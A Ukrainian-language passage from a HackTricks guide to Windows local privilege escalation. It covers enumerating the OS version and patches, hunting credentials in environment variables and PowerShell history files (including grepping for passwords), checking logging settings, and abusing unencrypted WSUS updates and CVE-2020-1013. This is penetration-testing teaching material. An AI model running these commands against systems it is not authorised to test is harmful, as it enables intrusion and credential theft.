# –õ–æ–∫–∞–ª—å–Ω–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ Windows

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ–≤—ñ–π –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É—î—Ç—å—Å—è –Ω–∞ HackTricks**? –∞–±–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **–ö—Ä–∞—â–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –ø–æ—à—É–∫—É –≤–µ–∫—Ç–æ—Ä—ñ–≤ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## –ü–æ—á–∞—Ç–∫–æ–≤–∞ —Ç–µ–æ—Ä—ñ—è Windows

### –¢–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É

**–Ø–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ —Ç–∞–∫–µ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É Windows, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø–µ—Ä–µ–¥ –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è–º:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### –†—ñ–≤–Ω—ñ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ

**–Ø–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ —Ç–∞–∫–µ —Ä—ñ–≤–Ω—ñ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ –≤ Windows, –≤–∞–º —Å–ª—ñ–¥ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø–µ—Ä–µ–¥ –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è–º:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## –ö–æ–Ω—Ç—Ä–æ–ª—å –∑–∞ –±–µ–∑–ø–µ–∫–æ—é Windows

–Ñ —Ä—ñ–∑–Ω—ñ —Ä–µ—á—ñ –≤ Windows, —è–∫—ñ –º–æ–∂—É—Ç—å **–∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–∞–º –ø–µ—Ä–µ–ª—ñ–∫—É —Å–∏—Å—Ç–µ–º–∏**, –∑–∞–ø—É—Å–∫—É –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –∞–±–æ –Ω–∞–≤—ñ—Ç—å **–≤–∏—è–≤–ª–µ–Ω–Ω—é –≤–∞—à–∏—Ö –¥—ñ–π**. –í–∞–º —Å–ª—ñ–¥ **–ø—Ä–æ—á–∏—Ç–∞—Ç–∏** –Ω–∞—Å—Ç—É–ø–Ω—É **—Å—Ç–æ—Ä—ñ–Ω–∫—É** —Ç–∞ **–ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏** –≤—Å—ñ —Ü—ñ **–∑–∞—Ö–∏—Å–Ω—ñ –º–µ—Ö–∞–Ω—ñ–∑–º–∏** –ø–µ—Ä–µ–¥ –ø–æ—á–∞—Ç–∫–æ–º –ø–µ—Ä–µ–ª—ñ–∫—É –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Å–∏—Å—Ç–µ–º—É

### –ü–µ—Ä–µ–ª—ñ–∫ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤–µ—Ä—Å—ñ—é

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —î –≤—ñ–¥–æ–º—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ –≤–µ—Ä—Å—ñ—ó Windows (—Ç–∞–∫–æ–∂ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ –ø–∞—Ç—á—ñ).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### –í–µ—Ä—Å—ñ—è –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –£—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π

–¶–µ–π [—Å–∞–π—Ç](https://msrc.microsoft.com/update-guide/vulnerability) –∫–æ—Ä–∏—Å–Ω–∏–π –¥–ª—è –ø–æ—à—É–∫—É –¥–µ—Ç–∞–ª—å–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –±–µ–∑–ø–µ–∫–∏ Microsoft. –¶—è –±–∞–∑–∞ –¥–∞–Ω–∏—Ö –º—ñ—Å—Ç–∏—Ç—å –ø–æ–Ω–∞–¥ 4 700 —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –±–µ–∑–ø–µ–∫–∏, –ø–æ–∫–∞–∑—É—é—á–∏ **–≤–µ–ª–∏–∫—É –ø–æ–≤–µ—Ä—Ö–Ω—é –∞—Ç–∞–∫–∏**, —è–∫—É –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ Windows.

**–ù–∞ —Å–∏—Å—Ç–µ–º—ñ**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas –º–∞—î –≤–±—É–¥–æ–≤–∞–Ω–∏–π watson)_

**–õ–æ–∫–∞–ª—å–Ω–æ –∑ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –ø—Ä–æ —Å–∏—Å—Ç–µ–º—É**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**–†–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó Github –∑ –µ–∫—Å–ø–ª–æ–π—Ç–∞–º–∏:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### –°–µ—Ä–µ–¥–æ–≤–∏—â–µ

–ß–∏ —î —è–∫—ñ-–Ω–µ–±—É–¥—å –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ/—Å–æ–∫–æ–≤–∏—Ç–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, –∑–±–µ—Ä–µ–∂–µ–Ω–∞ –≤ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### –Ü—Å—Ç–æ—Ä—ñ—è PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### –§–∞–π–ª–∏ —Ç—Ä–∞–Ω—Å–∫—Ä–∏–ø—Ü—ñ—ó PowerShell

–í–∏ –º–æ–∂–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ —É–≤—ñ–º–∫–Ω—É—Ç–∏ —Ü–µ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### –õ–æ–≥—É–≤–∞–Ω–Ω—è –º–æ–¥—É–ª—è PowerShell

–î–µ—Ç–∞–ª—ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–Ω–≤–µ—î—Ä–∞ PowerShell –∑–∞–ø–∏—Å—É—é—Ç—å—Å—è, –æ—Ö–æ–ø–ª—é—é—á–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, –≤–∏–∫–ª–∏–∫–∏ –∫–æ–º–∞–Ω–¥ —Ç–∞ —á–∞—Å—Ç–∏–Ω–∏ —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤. –û–¥–Ω–∞–∫ –ø–æ–≤–Ω—ñ –¥–µ—Ç–∞–ª—ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ç–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏ –≤–∏–≤–æ–¥—É –º–æ–∂—É—Ç—å –Ω–µ –±—É—Ç–∏ –∑–∞—Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ.

–©–æ–± —Ü–µ —É–≤—ñ–º–∫–Ω—É—Ç–∏, —Å–ª—ñ–¥—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è–º —É —Ä–æ–∑–¥—ñ–ª—ñ "–§–∞–π–ª–∏ —Ç—Ä–∞–Ω—Å–∫—Ä–∏–ø—Ü—ñ—ó" –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó, –æ–±–∏—Ä–∞—é—á–∏ **"–õ–æ–≥—É–≤–∞–Ω–Ω—è –º–æ–¥—É–ª—è"** –∑–∞–º—ñ—Å—Ç—å **"–¢—Ä–∞–Ω—Å–∫—Ä–∏–ø—Ü—ñ—è PowerShell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
–î–ª—è –ø–µ—Ä–µ–≥–ª—è–¥—É –æ—Å—Ç–∞–Ω–Ω—ñ—Ö 15 –ø–æ–¥—ñ–π –∑ –∂—É—Ä–Ω–∞–ª—ñ–≤ PowersShell –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **–õ–æ–≥—É–≤–∞–Ω–Ω—è –±–ª–æ–∫—ñ–≤ —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤**

–ó–∞–ø–∏—Å—É—î—Ç—å—Å—è –ø–æ–≤–Ω–∏–π –∑–∞–ø–∏—Å –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ —Ç–∞ –≤–º—ñ—Å—Ç—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å—Ü–µ–Ω–∞—Ä—ñ—é, —â–æ –≥–∞—Ä–∞–Ω—Ç—É—î –¥–æ–∫—É–º–µ–Ω—Ç—É–≤–∞–Ω–Ω—è –∫–æ–∂–Ω–æ–≥–æ –±–ª–æ–∫—É –∫–æ–¥—É –ø—ñ–¥ —á–∞—Å –π–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –∑–±–µ—Ä—ñ–≥–∞—î –ø–æ–≤–Ω–∏–π –∞—É–¥–∏—Ç–æ—Ä—Å—å–∫–∏–π —Å–ª—ñ–¥ –∫–æ–∂–Ω–æ—ó –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ, —â–æ —î —Ü—ñ–Ω–Ω–∏–º –¥–ª—è —Ñ–æ—Ä–µ–Ω–∑–∏–∫–∏ —Ç–∞ –∞–Ω–∞–ª—ñ–∑—É –∑–ª–æ–≤–º–∏—Å–Ω–æ—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏. –®–ª—è—Ö–æ–º –¥–æ–∫—É–º–µ–Ω—Ç—É–≤–∞–Ω–Ω—è –≤—Å—ñ—î—ó –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ –Ω–∞ –º–æ–º–µ–Ω—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–∞–¥–∞—é—Ç—å—Å—è –¥–µ—Ç–∞–ª—å–Ω—ñ –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –ø—Ä–æ –ø—Ä–æ—Ü–µ—Å.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
–ñ—É—Ä–Ω–∞–ª–∏ –ø–æ–¥—ñ–π –¥–ª—è –±–ª–æ–∫—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ –ü–æ–¥—ñ—ó Windows –∑–∞ —à–ª—è—Ö–æ–º: **–ñ—É—Ä–Ω–∞–ª–∏ –ø—Ä–æ–≥—Ä–∞–º —Ç–∞ —Å–ª—É–∂–± > Microsoft > Windows > PowerShell > –†–æ–±–æ—á—ñ**.\
–î–ª—è –ø–µ—Ä–µ–≥–ª—è–¥—É –æ—Å—Ç–∞–Ω–Ω—ñ—Ö 20 –ø–æ–¥—ñ–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### –î–∏—Å–∫–∏
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

–í–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Å–∏—Å—Ç–µ–º—É, —è–∫—â–æ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–µ –∑–∞–ø–∏—Ç—É—é—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é http**S**, –∞ –ª–∏—à–µ http.

–í–∏ –ø–æ—á–∏–Ω–∞—î—Ç–µ –∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —á–∏ –º–µ—Ä–µ–∂–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –æ–Ω–æ–≤–ª–µ–Ω–Ω—è WSUS –±–µ–∑ SSL, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ –Ω–∞—Å—Ç—É–ø–Ω–µ:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –≤—ñ–¥–ø–æ–≤—ñ–¥—å —É –≤–∏–≥–ª—è–¥—ñ:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
–Ü —è–∫—â–æ `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` –¥–æ—Ä—ñ–≤–Ω—é—î `1`.

–¢–æ–¥—ñ, **—Ü–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏.** –Ø–∫—â–æ –æ—Å—Ç–∞–Ω–Ω—ñ–π —Ä–µ—î—Å—Ç—Ä –¥–æ—Ä—ñ–≤–Ω—é—î 0, —Ç–æ –∑–∞–ø–∏—Å WSUS –±—É–¥–µ –ø—Ä–æ—ñ–≥–Ω–æ—Ä–æ–≤–∞–Ω–æ.

–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç–∞–∫—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - –¶–µ —Å–∫—Ä–∏–ø—Ç–∏ –∑–±—Ä–æ–π–æ–≤–∞–Ω–æ–≥–æ –≤–∏–±—É—Ö—É —Å–µ—Ä–µ–¥ –ª—é–¥–µ–π –ø–æ—Å–µ—Ä–µ–¥–Ω–∏–∫—ñ–≤ –¥–ª—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è "—Ñ–∞–ª—å—à–∏–≤–∏—Ö" –æ–Ω–æ–≤–ª–µ–Ω—å –≤ –Ω–µ–∑–∞—Ö–∏—â–µ–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫ WSUS.

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è —Ç—É—Ç:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –ø–æ–≤–Ω–∏–π –∑–≤—ñ—Ç —Ç—É—Ç**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
–ó–∞ —Å—É—Ç–Ω—ñ—Å—Ç—é, —Ü–µ –Ω–µ–¥–æ–ª—ñ–∫, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ü—è –ø–æ–º–∏–ª–∫–∞:

> –Ø–∫—â–æ —É –Ω–∞—Å —î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –Ω–∞—à –ª–æ–∫–∞–ª—å–Ω–∏–π –ø—Ä–æ–∫—Å—ñ, —ñ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è Windows –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ–∫—Å—ñ, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π —É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è—Ö Internet Explorer, –º–∏, –æ—Ç–∂–µ, –º–∞—î–º–æ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–ø—É—Å–∫–∞—Ç–∏ [PyWSUS](https://github.com/GoSecure/pywsus) –ª–æ–∫–∞–ª—å–Ω–æ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –≤–ª–∞—Å–Ω–æ–≥–æ —Ç—Ä–∞—Ñ—ñ–∫—É —Ç–∞ –∑–∞–ø—É—Å–∫—É –∫–æ–¥—É —è–∫ –ø—ñ–¥–≤–∏—â–µ–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –Ω–∞ –Ω–∞—à–æ–º—É –∞–∫—Ç–∏–≤—ñ.
>
> –ö—Ä—ñ–º —Ç–æ–≥–æ, –æ—Å–∫—ñ–ª—å–∫–∏ —Å–ª—É–∂–±–∞ WSUS –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–æ–Ω–∞ —Ç–∞–∫–æ–∂ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ –π–æ–≥–æ —Å—Ö–æ–≤–∏—â–µ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤. –Ø–∫—â–æ –º–∏ –≥–µ–Ω–µ—Ä—É—î–º–æ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–ª—è —ñ–º–µ–Ω—ñ —Ö–æ—Å—Ç–∞ WSUS —ñ –¥–æ–¥–∞—î–º–æ —Ü–µ–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —É —Å—Ö–æ–≤–∏—â–µ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –º–∏ –∑–º–æ–∂–µ–º–æ –ø–µ—Ä–µ—Ö–æ–ø–ª—é–≤–∞—Ç–∏ —è–∫ HTTP, —Ç–∞–∫ —ñ HTTPS —Ç—Ä–∞—Ñ—ñ–∫ WSUS. WSUS –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –º–µ—Ö–∞–Ω—ñ–∑–º–∏ –ø–æ–¥—ñ–±–Ω—ñ –¥–æ HSTS –¥–ª—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ç–∏–ø—É –¥–æ–≤—ñ—Ä–∏ –ø—Ä–∏ –ø–µ—Ä—à–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞. –Ø–∫—â–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–π, –¥–æ–≤—ñ—Ä—è—î—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º —ñ –º–∞—î –ø—Ä–∞–≤–∏–ª—å–Ω–µ —ñ–º'—è —Ö–æ—Å—Ç–∞, –π–æ–≥–æ –ø—Ä–∏–π–º–µ —Å–ª—É–∂–±–∞.

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (–ø—ñ—Å–ª—è –π–æ–≥–æ –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—è).

## KrbRelayUp

